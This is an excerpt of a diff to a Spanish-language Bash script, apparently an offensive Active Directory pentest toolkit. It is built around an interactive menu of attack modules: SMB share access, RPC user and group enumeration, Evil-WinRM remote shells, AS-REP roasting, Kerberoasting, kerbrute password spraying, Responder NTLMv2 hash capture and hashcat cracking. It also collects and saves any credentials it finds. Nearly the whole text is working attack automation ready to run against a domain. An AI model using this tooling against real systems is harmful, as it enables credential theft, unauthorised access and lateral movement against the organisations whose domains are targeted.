+            smbclient "//$TARGET/SYSVOL" -U "$CRED_USER%$CRED_PASS" 2>/dev/null
+            ;;
+        2)
+            log_info "Accediendo a NETLOGON..."
+            smbclient "//$TARGET/NETLOGON" -U "$CRED_USER%$CRED_PASS" 2>/dev/null
+            ;;
+        3)
+            log_info "Listando recursos en $TARGET..."
+            smbclient -L "//$TARGET" -U "${DOMAIN}/${CRED_USER}%${CRED_PASS}" 2>/dev/null | tee "$OUTPUT_DIR/smb_shares_list.txt"
+            ;;
+        4)
+            read -p "$(echo -e ${CYAN}"  [?] Nombre del recurso: "${NC})" SHARE_NAME
+            log_info "Accediendo a $SHARE_NAME..."
+            smbclient "//$TARGET/$SHARE_NAME" -U "${DOMAIN}/${CRED_USER}%${CRED_PASS}" 2>/dev/null
+            ;;
+    esac
+    log_success "Sesión SMB cerrada"
+}
+
+# ─── MÓDULO G: Enumeración RPC ───────────────────────────────
+modulo_rpc() {
+    if ! port_open 135 && ! port_open 445; then
+        log_warn "Puertos RPC/SMB cerrados — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Enumeración RPC (rpcclient)"
+    mostrar_credenciales
+
+    if [ -z "$CRED_USER" ]; then
+        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
+        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
+    fi
+
+    if ! check_tool rpcclient; then
+        log_error "rpcclient no disponible"
+        return
+    fi
+
+    local out="$OUTPUT_DIR/rpc_enum.txt"
+    echo ""
+    echo -e "  ${WHITE}Opciones de enumeración RPC:${NC}"
+    echo -e "  ${CYAN}[1]${NC} enumdomusers   ${DIM}(todos los usuarios del dominio)${NC}"
+    echo -e "  ${CYAN}[2]${NC} enumdomgroups  ${DIM}(todos los grupos)${NC}"
+    echo -e "  ${CYAN}[3]${NC} querygroup/user por RID"
+    echo -e "  ${CYAN}[4]${NC} Sesión interactiva completa"
+    echo ""
+    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" RPC_OPT
+
+    case $RPC_OPT in
+        1)
+            log_info "Enumerando usuarios del dominio..."
+            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "enumdomusers" 2>/dev/null | tee "$out"
+            ;;
+        2)
+            log_info "Enumerando grupos del dominio..."
+            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "enumdomgroups" 2>/dev/null | tee "$out"
+            ;;
+        3)
+            read -p "$(echo -e ${CYAN}"  [?] ¿Tipo? (group/user): "${NC})" RPC_TYPE
+            read -p "$(echo -e ${CYAN}"  [?] RID (ej: 0x200): "${NC})" RPC_RID
+            CMD="query${RPC_TYPE} ${RPC_RID}"
+            log_info "Ejecutando: $CMD"
+            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" -c "$CMD" 2>/dev/null | tee "$out"
+            ;;
+        4)
+            log_info "Abriendo sesión interactiva rpcclient..."
+            rpcclient -U "$CRED_USER%$CRED_PASS" "$TARGET" 2>/dev/null
+            ;;
+    esac
+
+    cat "$out" >> "$REPORT_FILE" 2>/dev/null
+    log_success "Completado → $out"
+}
+
+# ─── MÓDULO H: Acceso remoto Evil-WinRM ──────────────────────
+modulo_winrm() {
+    if ! port_open 5985 && ! port_open 5986; then
+        log_warn "Puertos WinRM (5985/5986) cerrados — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Acceso Remoto (Evil-WinRM)"
+    mostrar_credenciales
+
+    if ! check_tool evil-winrm; then
+        log_error "evil-winrm no disponible — instala: sudo gem install evil-winrm"
+        return
+    fi
+
+    if [ -z "$CRED_USER" ]; then
+        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
+        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
+    fi
+
+    local WINRM_PORT=5985
+    port_open 5986 && WINRM_PORT=5986
+
+    log_warn "Abriendo shell Evil-WinRM en $TARGET:$WINRM_PORT como $CRED_USER"
+    log_info "Escribe 'exit' para cerrar la sesión"
+    echo ""
+    evil-winrm -i "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" 2>/dev/null
+    log_success "Sesión Evil-WinRM cerrada"
+}
+
+# ─── MÓDULO I: AS-REP Roasting ───────────────────────────────
+modulo_asrep() {
+    if ! port_open 88; then
+        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — AS-REP Roasting"
     detectar_dominio
     pedir_diccionarios
 
-    if ! command -v impacket-GetUserSPNs &>/dev/null; then
+    if ! check_tool impacket-GetNPUsers; then
+        log_error "impacket-GetNPUsers no disponible"
+        return
+    fi
+
+    local out="$OUTPUT_DIR/asrep.txt"
+    log_info "Buscando cuentas sin preautenticación Kerberos..."
+    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" \
+        -no-pass -usersfile "$USERS_FILE" 2>/dev/null | tee "$out"
+
+    if grep -q "\$krb5asrep\$" "$out"; then
+        log_warn "¡Hash AS-REP obtenido!"
+        grep "\$krb5asrep\$" "$out" > "$OUTPUT_DIR/hashes_asrep.txt"
+        CRED_HASH=$(head -1 "$OUTPUT_DIR/hashes_asrep.txt")
+        log_info "Crackear: hashcat -m 18200 $OUTPUT_DIR/hashes_asrep.txt /usr/share/wordlists/rockyou.txt"
+    else
+        log_success "Ninguna cuenta vulnerable ✓"
+    fi
+    cat "$out" >> "$REPORT_FILE"
+    log_success "Completado → $out"
+}
+
+# ─── MÓDULO J: Kerberoasting ─────────────────────────────────
+modulo_kerberoasting() {
+    if ! port_open 88; then
+        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Kerberoasting"
+    detectar_dominio
+    pedir_diccionarios
+
+    if ! check_tool impacket-GetUserSPNs; then
         log_error "impacket-GetUserSPNs no disponible"
         return
     fi
 
-    log_info "Buscando SPNs vulnerables con credenciales válidas..."
+    local out="$OUTPUT_DIR/kerberoasting.txt"
     local encontrado=0
 
     while IFS= read -r user && [ $encontrado -eq 0 ]; do
@@ -344,9 +706,8 @@ modulo_kerberoasting() {
                     log_warn "¡Hash TGS obtenido!"
                     grep "\$krb5tgs\$" "$out" > "$OUTPUT_DIR/hashes_kerberoast.txt"
                     log_info "Crackear: hashcat -m 13100 $OUTPUT_DIR/hashes_kerberoast.txt /usr/share/wordlists/rockyou.txt"
-                else
-                    log_success "No hay SPNs vulnerables ✓"
                 fi
+                guardar_credenciales "$user" "$pass" "kerberoasting"
                 encontrado=1
             fi
         done < "$PASSWORDS_FILE"
@@ -357,21 +718,24 @@ modulo_kerberoasting() {
     log_success "Completado → $out"
 }
 
-# ─── MÓDULO 8: Password Spraying ────────────────────────────
+# ─── MÓDULO K: Password Spraying ─────────────────────────────
 modulo_spray() {
-    log_section "MÓDULO 8 — Password Spraying"
-    local out="$OUTPUT_DIR/08_spray.txt"
-
+    if ! port_open 88; then
+        log_warn "Puerto 88 (Kerberos) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Password Spraying (kerbrute)"
     detectar_dominio
     pedir_diccionarios
 
-    if ! command -v kerbrute &>/dev/null; then
+    if ! check_tool kerbrute; then
         log_warn "kerbrute no instalado"
         log_info "Instalar: wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute"
         return
     fi
 
-    log_warn "⚠️  Lockout en 5 intentos — 1 contraseña por ronda"
+    local out="$OUTPUT_DIR/spray.txt"
+    log_warn "⚠️ Lockout en 5 intentos — 1 contraseña por ronda"
     while IFS= read -r pass; do
         log_info "Probando: $pass"
         kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET" "$USERS_FILE" "$pass" 2>/dev/null | tee -a "$out"
@@ -404,68 +768,133 @@ reporte_final() {
         fi
     }
 
-    verificar "Puertos SMB/RPC/WinRM abiertos" "$OUTPUT_DIR/01_nmap.txt"           "445/tcp open|135/tcp open|5985/tcp open" "1"
-    verificar "LDAP anónimo expuesto"           "$OUTPUT_DIR/02_ldap.txt"           "result: 0 Success"                       "1"
-    verificar "DNS Zone Transfer bloqueado"     "$OUTPUT_DIR/03_dns.txt"            "Transfer failed|REFUSED"                 "0"
-    verificar "RPC anónimo"                     "$OUTPUT_DIR/04_rpc.txt"            "user:"                                   "1"
-    verificar "Credenciales SMB débiles"        "$OUTPUT_DIR/05_smb_bruteforce.txt" "\[\+\]"                                  "1"
-    verificar "AS-REP Roasting"                 "$OUTPUT_DIR/06_asrep.txt"          "krb5asrep"                               "1"
-    verificar "Kerberoasting"                   "$OUTPUT_DIR/07_kerberoasting.txt"  "krb5tgs"                                 "1"
+    verificar "Puertos SMB/RPC/WinRM abiertos"  "$OUTPUT_DIR/01_nmap.txt"      "445/tcp open|135/tcp open|5985/tcp open" "1"
+    verificar "LDAP anónimo expuesto"            "$OUTPUT_DIR/ldap.txt"         "result: 0 Success"                       "1"
+    verificar "Credenciales SMB débiles"         "$OUTPUT_DIR/smb_netexec.txt"  "\[\+\]"                                  "1"
+    verificar "AS-REP Roasting"                  "$OUTPUT_DIR/asrep.txt"        "krb5asrep"                               "1"
+    verificar "Kerberoasting"                    "$OUTPUT_DIR/kerberoasting.txt" "krb5tgs"                                 "1"
+    verificar "Hash NTLMv2 capturado"            "$OUTPUT_DIR/hash_capturado.txt" "."                                     "1"
+    verificar "Hash crackeado"                   "$OUTPUT_DIR/hashcat_resultado.txt" "."                                  "1"
 
     echo ""
-    echo -e "  ${RED}${BOLD}Vulnerabilidades: $v${NC}"
-    echo -e "  ${GREEN}${BOLD}Seguros:          $s${NC}"
+
+    if [ -f "$OUTPUT_DIR/credenciales_encontradas.txt" ]; then
+        echo -e "  ${GREEN}${BOLD}Credenciales descubiertas:${NC}"
+        cat "$OUTPUT_DIR/credenciales_encontradas.txt" | while read l; do
+            echo -e "  ${GREEN}  ✓ $l${NC}"
+        done
+        echo ""
+    fi
+
+    echo -e "  ${RED}${BOLD}Vulnerabilidades encontradas: $v${NC}"
+    echo -e "  ${GREEN}${BOLD}Controles seguros:            $s${NC}"
     echo ""
     echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
     echo -e "${GREEN}  📁 $OUTPUT_DIR${NC}"
     echo -e "${GREEN}  📄 $REPORT_FILE${NC}"
     echo ""
-
     echo -e "\nRESUMEN: Vulnerabilidades=$v | Seguros=$s | $(date)" >> "$REPORT_FILE"
 }
 
-# ─── MENÚ ────────────────────────────────────────────────────
+# ─── MENÚ PRINCIPAL ──────────────────────────────────────────
+mostrar_menu() {
+    echo ""
+    echo -e "${WHITE}${BOLD}  ¿Qué deseas hacer?${NC}"
+    echo -e "  ${CYAN}Target: ${GREEN}$TARGET${NC}   ${CYAN}Iface: ${GREEN}$IFACE${NC}   ${CYAN}Creds: ${GREEN}${CRED_USER:-ninguna}${NC}"
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Reconocimiento ───────────────────────────${NC}"
+
+    # Nmap siempre disponible
+    echo -e "  ${CYAN}[1]${NC} Escaneo de puertos ${DIM}(nmap -sV)${NC}"
+
+    # LDAP según puerto
+    if port_open 389; then
+        echo -e "  ${CYAN}[2]${NC} LDAP anónimo ${DIM}(ldapsearch)${NC}"
+    else
+        echo -e "  ${DIM}  [2] LDAP anónimo — puerto 389 cerrado${NC}"
+    fi
+
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Captura y crackeo de credenciales ────────${NC}"
+    echo -e "  ${CYAN}[3]${NC} Capturar hash NTLMv2 ${DIM}(Responder)${NC}"
+    echo -e "  ${CYAN}[4]${NC} Crackear hash ${DIM}(hashcat diccionario + fuerza bruta)${NC}"
+
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Ataques SMB ──────────────────────────────${NC}"
+    if port_open 445; then
+        echo -e "  ${CYAN}[5]${NC} Ataque diccionario SMB ${DIM}(netexec)${NC}"
+        echo -e "  ${CYAN}[6]${NC} Enumeración SMB + privilegios ${DIM}(crackmapexec + smbmap)${NC}"
+        echo -e "  ${CYAN}[7]${NC} Acceso y extracción ${DIM}(smbclient)${NC}"
+    else
+        echo -e "  ${DIM}  [5][6][7] SMB — puerto 445 cerrado${NC}"
+    fi
+
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Enumeración y acceso ─────────────────────${NC}"
+    if port_open 135 || port_open 445; then
+        echo -e "  ${CYAN}[8]${NC} Enumeración RPC ${DIM}(rpcclient usuarios/grupos)${NC}"
+    else
+        echo -e "  ${DIM}  [8] RPC — puertos 135/445 cerrados${NC}"
+    fi
+    if port_open 5985 || port_open 5986; then
+        echo -e "  ${CYAN}[9]${NC} Acceso remoto ${DIM}(Evil-WinRM)${NC}"
+    else
+        echo -e "  ${DIM}  [9] Evil-WinRM — puertos 5985/5986 cerrados${NC}"
+    fi
+
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Kerberos ──────────────────────────────────${NC}"
+    if port_open 88; then
+        echo -e "  ${CYAN}[A]${NC} AS-REP Roasting ${DIM}(impacket)${NC}"
+        echo -e "  ${CYAN}[B]${NC} Kerberoasting   ${DIM}(impacket)${NC}"
+        echo -e "  ${CYAN}[C]${NC} Password Spraying ${DIM}(kerbrute)${NC}"
+    else
+        echo -e "  ${DIM}  [A][B][C] Kerberos — puerto 88 cerrado${NC}"
+    fi
+
+    echo ""
+    echo -e "${BOLD}${YELLOW}  ── Otros ────────────────────────────────────${NC}"
+    echo -e "  ${CYAN}[D]${NC} Ver credenciales encontradas"
+    echo -e "  ${CYAN}[E]${NC} Reporte final"
+    echo -e "  ${CYAN}[R]${NC} Nuevo scan ${DIM}(cambiar IP)${NC}"
+    echo -e "  ${CYAN}[0]${NC} Salir"
+    echo ""
+}
+
 menu() {
     while true; do
-        echo ""
-        echo -e "${WHITE}${BOLD}  ¿Qué deseas hacer?${NC}"
-        echo -e "  ${CYAN}Target actual: ${GREEN}$TARGET${NC}  ${CYAN}Carpeta: ${GREEN}$(basename $OUTPUT_DIR)${NC}"
-        echo ""
-        echo -e "  ${CYAN}[1]${NC} Reconocimiento     ${YELLOW}(NMAP + LDAP + DNS)${NC}        solo necesita IP"
-        echo -e "  ${CYAN}[2]${NC} Enumeración RPC    ${YELLOW}(rpcclient)${NC}                solo necesita IP"
-        echo -e "  ${CYAN}[3]${NC} Ataque diccionario ${YELLOW}(SMB bruteforce)${NC}           pide diccionarios"
-        echo -e "  ${CYAN}[4]${NC} AS-REP Roasting    ${YELLOW}(Kerberos sin preauth)${NC}     pide diccionarios"
-        echo -e "  ${CYAN}[5]${NC} Kerberoasting      ${YELLOW}(SPNs)${NC}                     pide diccionarios"
-        echo -e "  ${CYAN}[6]${NC} Password Spraying  ${YELLOW}(kerbrute)${NC}                 pide diccionarios"
-        echo -e "  ${CYAN}[7]${NC} Todo completo      ${YELLOW}(todos los módulos)${NC}"
-        echo -e "  ${CYAN}[8]${NC} Nuevo scan         ${YELLOW}(cambiar IP y carpeta)${NC}"
-        echo -e "  ${CYAN}[0]${NC} Salir"
-        echo ""
+        mostrar_menu
         read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" opcion
         echo ""
 
-        case $opcion in
-            1) modulo_nmap; modulo_ldap; modulo_dns; reporte_final ;;
-            2) modulo_rpc; reporte_final ;;
-            3) modulo_smb_bruteforce; reporte_final ;;
-            4) modulo_asrep; reporte_final ;;
-            5) modulo_kerberoasting; reporte_final ;;
-            6) modulo_spray; reporte_final ;;
-            7)
-                modulo_nmap; modulo_ldap; modulo_dns; modulo_rpc
-                modulo_smb_bruteforce; modulo_asrep; modulo_kerberoasting; modulo_spray
-                reporte_final ;;
-            8)
-                # Resetear variables para nuevo scan
+        case "${opcion^^}" in
+            1) modulo_portscan; reporte_final ;;
+            2) modulo_ldap ;;
+            3) modulo_responder ;;
+            4) modulo_hashcat ;;
+            5) modulo_smb_netexec ;;
+            6) modulo_smb_enum ;;
+            7) modulo_smb_acceso ;;
+            8) modulo_rpc ;;
+            9) modulo_winrm ;;
+            A) modulo_asrep ;;
+            B) modulo_kerberoasting ;;
+            C) modulo_spray ;;
+            D) mostrar_credenciales ;;
+            E) reporte_final ;;
+            R)
                 TARGET=""; DOMAIN=""; USERS_FILE=""; PASSWORDS_FILE=""
+                CRED_USER=""; CRED_PASS=""; CRED_HASH=""
                 TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
                 OUTPUT_DIR=""; REPORT_FILE=""
+                PORT_STATUS=()
                 banner
+                seleccionar_interfaz
                 pedir_target
                 ;;
             0)
                 echo -e "${CYAN}  Saliendo...${NC}"
-                echo -e "${WHITE}  Resultados guardados en: $OUTPUT_DIR${NC}"
+                [ -n "$OUTPUT_DIR" ] && echo -e "${WHITE}  Resultados en: $OUTPUT_DIR${NC}"
                 echo ""
                 exit 0
                 ;;
@@ -476,5 +905,7 @@ menu() {
 
 # ─── INICIO ──────────────────────────────────────────────────
 banner
+seleccionar_interfaz
 pedir_target
+modulo_portscan
 menu
